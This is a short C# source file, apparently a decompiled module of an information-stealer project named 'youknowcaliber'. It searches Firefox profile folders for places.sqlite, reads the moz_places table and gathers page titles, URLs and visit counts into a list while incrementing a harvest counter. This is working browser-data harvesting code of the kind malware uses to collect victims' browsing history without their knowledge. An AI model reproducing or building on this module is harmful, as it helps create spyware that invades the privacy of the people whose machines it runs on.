﻿using System;
using System.Collections.Generic;
using System.IO;
using youknowcaliber.Chromium;

namespace youknowcaliber.History
{
	internal class cHistory
	{
		private static string GetHistoryDBPath(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				bool flag = Directory.Exists(path2);
				if (flag)
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						bool flag2 = File.Exists(str + "\\places.sqlite");
						if (flag2)
						{
							return str + "\\places.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		public static List<Site> Get(string path)
		{
			List<Site> list = new List<Site>();
			try
			{
				string historyDBPath = cHistory.GetHistoryDBPath(path);
				SQLite sqlite = SqlReader.ReadTable(historyDBPath, "moz_places");
				bool flag = sqlite == null;
				if (flag)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Site item = default(Site);
					item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
					item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					item.iCount = Convert.ToInt32(sqlite.GetValue(i, 4)) + 1;
					bool flag2 = item.sTitle != "0";
					if (flag2)
					{
						Counting.History++;
						list.Add(item);
					}
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<Site>();
		}
	}
}
